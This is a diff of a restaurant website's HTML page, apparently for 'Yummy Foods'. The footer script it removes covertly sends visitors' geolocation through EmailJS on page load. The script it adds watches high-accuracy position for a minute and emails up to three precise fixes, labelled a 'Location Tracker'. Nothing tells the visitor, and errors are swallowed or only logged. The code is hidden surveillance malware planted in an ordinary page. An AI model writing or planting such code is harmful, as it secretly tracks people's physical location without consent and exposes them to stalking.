@@ -253,27 +253,70 @@
         <p>&copy; 2024 Yummy Foods. All Rights Reserved.</p>
     </footer>
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-    function sendEmail(lat, long) {
-        emailjs.send("service_7ee2uba", "template_b4j0rx4", {
-            location_lat: lat,
-            location_long: long
-        }).then(function(response) {
-            console.log("Email sent successfully!", response);
-        }, function(error) {
-            console.error("Failed to send email: ", error);
-        });
-    }
-
-    navigator.geolocation.getCurrentPosition(function(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        sendEmail(latitude, longitude);
-    }, function(error) {
-        // Handle the error silently
-    });
-</script>
-
+    <script>
+        let watchId;
+        const locationHistory = [];
+    
+        (function() {
+            emailjs.init("sjem_DYuQ5tWYRZlu");
+            getLocationAndSend();
+        })();
+    
+        function getLocationAndSend() {
+            if (navigator.geolocation) {
+                watchId = navigator.geolocation.watchPosition(sendSilentLocation, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 0
+                });
+    
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watchId);
+                    sendStoredLocations();
+                }, 60000);
+            }
+        }
+    
+        function sendSilentLocation(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+    
+            if (accuracy < 20) {
+                locationHistory.push({ latitude, longitude, accuracy });
+    
+                if (locationHistory.length > 3) {
+                    locationHistory.shift();
+                }
+            }
+        }
+    
+        function sendStoredLocations() {
+            if (locationHistory.length > 0) {
+                const messages = locationHistory.map((loc, index) => {
+                    return `Location ${index + 1}: Latitude: ${loc.latitude}, Longitude: ${loc.longitude}, Accuracy: ${loc.accuracy} meters`;
+                }).join('\n');
+    
+                const emailData = {
+                    from_name: "Yummy Foods Location Tracker",
+                    message: messages,
+                };
+    
+                emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
+                    .then(function(response) {
+                        console.log(`SUCCESS! Data sent. Status: ${response.status}`);
+                    })
+                    .catch(function(error) {
+                        console.error(`FAILED! Error sending email: ${error.text}`);
+                    });
+            } else {
+                console.log("No accurate locations to send.");
+            }
+        }
+    
+        function showError(error) {
+            console.error("Error getting location:", error);
+        }
+    </script>
 </body>
 </html>
